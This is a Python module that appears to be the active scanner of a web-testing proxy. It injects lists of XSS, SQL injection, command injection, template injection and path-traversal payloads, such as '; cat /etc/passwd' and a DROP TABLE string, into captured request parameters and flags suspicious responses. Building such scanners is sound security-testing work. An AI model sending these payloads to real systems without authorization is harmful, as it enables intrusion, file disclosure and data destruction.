from __future__ import annotations

import asyncio
import base64
import json
import re
import time
from dataclasses import dataclass
from typing import Any
from urllib.parse import parse_qs, urlencode

from pypproxy.core.http import client as http_client
from pypproxy.core.http import elapsed_ms, flatten_headers
from pypproxy.store.models import Entry

# ---- Payload lists ----

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "';alert(1)//",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    '"><img src=x onerror=alert`1`>',
    "${alert(1)}",
    "{{7*7}}",  # SSTI probe
    "#{7*7}",
]

SQLI_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "1' OR '1'='1",
    "1 OR 1=1",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' AND 1=2 UNION SELECT NULL,NULL--",
    "admin'--",
    "' OR 1=1#",
    "1' AND SLEEP(2)--",  # time-based blind
]

CMDI_PAYLOADS = [
    "; ls",
    "| ls",
    "&& ls",
    "|| ls",
    "; cat /etc/passwd",
    "$(id)",
    "`id`",
    "; ping -c 1 127.0.0.1",
    "| whoami",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "{{''.__class__.__mro__}}",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

ALL_PAYLOADS: dict[str, list[str]] = {
    "xss": XSS_PAYLOADS,
    "sqli": SQLI_PAYLOADS,
    "cmdi": CMDI_PAYLOADS,
    "ssti": SSTI_PAYLOADS,
    "path_traversal": PATH_TRAVERSAL_PAYLOADS,
}


@dataclass
class ScanResult:
    param: str
    category: str
    payload: str
    status_code: int = 0
    response_body: bytes = b""
    duration_ms: int = 0
    error: str = ""
    suspicious: bool = False
    reason: str = ""

    def to_dict(self) -> dict:
        return {
            "param": self.param,
            "category": self.category,
            "payload": self.payload,
            "status_code": self.status_code,
            "response_body": base64.b64encode(self.response_body).decode()
            if self.response_body
            else "",
            "duration_ms": self.duration_ms,
            "error": self.error,
            "suspicious": self.suspicious,
            "reason": self.reason,
        }


def _extract_params(entry: Entry) -> dict[str, str]:
    """Extract injectable parameters from query string and JSON body."""
    params: dict[str, str] = {}

    if entry.query:
        for k, vs in parse_qs(entry.query).items():
            params[f"query:{k}"] = vs[0] if vs else ""

    if entry.req_body:
        try:
            data = json.loads(entry.req_body.decode("utf-8", errors="replace"))
            _collect_strings(data, "", params)
        except Exception:
            pass

    return params


def _collect_strings(obj: Any, prefix: str, out: dict[str, str]) -> None:
    if isinstance(obj, dict):
        for k, v in obj.items():
            _collect_strings(v, f"body:{prefix}{k}", out)
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            _collect_strings(v, f"{prefix}[{i}].", out)
    elif isinstance(obj, str):
        out[prefix.rstrip(".")] = obj


def _apply_payload(entry: Entry, param_key: str, payload: str) -> tuple[str, bytes]:
    """Apply payload to the appropriate parameter. Returns (url, body)."""
    url = entry.base_url
    body = entry.req_body

    if param_key.startswith("query:"):
        key = param_key.removeprefix("query:")
        qs = parse_qs(entry.query)
        qs[key] = [payload]
        url += "?" + urlencode(qs, doseq=True)
    elif param_key.startswith("body:"):
        key_path = param_key.removeprefix("body:")
        try:
            data = json.loads(body.decode("utf-8", errors="replace"))
            _set_nested(data, key_path, payload)
            body = json.dumps(data).encode()
        except Exception:
            pass
        if entry.query:
            url += "?" + entry.query
    else:
        if entry.query:
            url += "?" + entry.query

    return url, body


def _set_nested(obj: Any, key_path: str, value: Any) -> None:
    parts = re.split(r"[.\[\]]", key_path)
    parts = [p for p in parts if p]
    for part in parts[:-1]:
        if isinstance(obj, dict):
            obj = obj.get(part, {})
        elif isinstance(obj, list):
            try:
                obj = obj[int(part)]
            except (ValueError, IndexError):
                return
    if parts:
        last = parts[-1]
        if isinstance(obj, dict):
            obj[last] = value


def _is_suspicious(resp_body: bytes, payload: str, category: str, status: int) -> tuple[bool, str]:
    """Heuristic check for vulnerability indicators."""
    text = resp_body.decode("utf-8", errors="replace").lower()

    if category == "xss" and payload.lower() in text:
        return True, "Payload reflected in response"

    if category == "sqli":
        sql_errors = [
            "sql syntax",
            "mysql",
            "sqlite",
            "ora-",
            "postgresql",
            "odbc",
            "jdbc",
            "syntax error",
            "unclosed quotation",
            "you have an error in your sql",
        ]
        for err in sql_errors:
            if err in text:
                return True, f"SQL error signature: '{err}'"
        if payload == "1' AND SLEEP(2)--":
            return False, ""  # time-based handled separately

    if category == "cmdi":
        cmdi_indicators = ["root:", "uid=", "bin/", "directory of", "volume serial"]
        for ind in cmdi_indicators:
            if ind in text:
                return True, f"Command output indicator: '{ind}'"

    if category == "ssti":
        if "49" in text and "{{7*7}}" in payload:
            return True, "SSTI: 7*7=49 reflected"
        if "49" in text and "${7*7}" in payload:
            return True, "SSTI: 7*7=49 reflected"

    if category == "path_traversal":
        pt_indicators = ["root:x:", "[boot loader]", "for 1 file"]
        for ind in pt_indicators:
            if ind in text:
                return True, f"File content indicator: '{ind}'"

    if status == 500:
        return True, "Server error (500) — possible injection point"

    return False, ""


async def run_scan(
    entry: Entry,
    categories: list[str] | None = None,
    concurrency: int = 5,
    timeout: int = 15,
) -> list[ScanResult]:
    """Run active scan on the entry. Returns list of findings."""
    if categories is None:
        categories = list(ALL_PAYLOADS.keys())

    params = _extract_params(entry)
    if not params:
        return []

    sem = asyncio.Semaphore(concurrency)
    req_headers = flatten_headers(entry.req_headers)
    tasks = []

    for param_key in params:
        for cat in categories:
            if cat not in ALL_PAYLOADS:
                continue
            for payload in ALL_PAYLOADS[cat]:
                tasks.append((param_key, cat, payload))

    async def _test(param_key: str, cat: str, payload: str) -> ScanResult:
        async with sem:
            url, body = _apply_payload(entry, param_key, payload)
            start = time.monotonic()
            try:
                async with http_client(timeout) as client:
                    resp = await client.request(
                        method=entry.method,
                        url=url,
                        headers=req_headers,
                        content=body,
                    )
                status = resp.status_code
                resp_body = resp.content[:1024]
                error = ""
            except Exception as e:
                status = 0
                resp_body = b""
                error = str(e)

            dur = elapsed_ms(start)
            suspicious, reason = _is_suspicious(resp_body, payload, cat, status)
            return ScanResult(
                param=param_key,
                category=cat,
                payload=payload,
                status_code=status,
                response_body=resp_body,
                duration_ms=dur,
                error=error,
                suspicious=suspicious,
                reason=reason,
            )

    gathered = await asyncio.gather(*[_test(p, c, pl) for p, c, pl in tasks])
    return list(gathered)
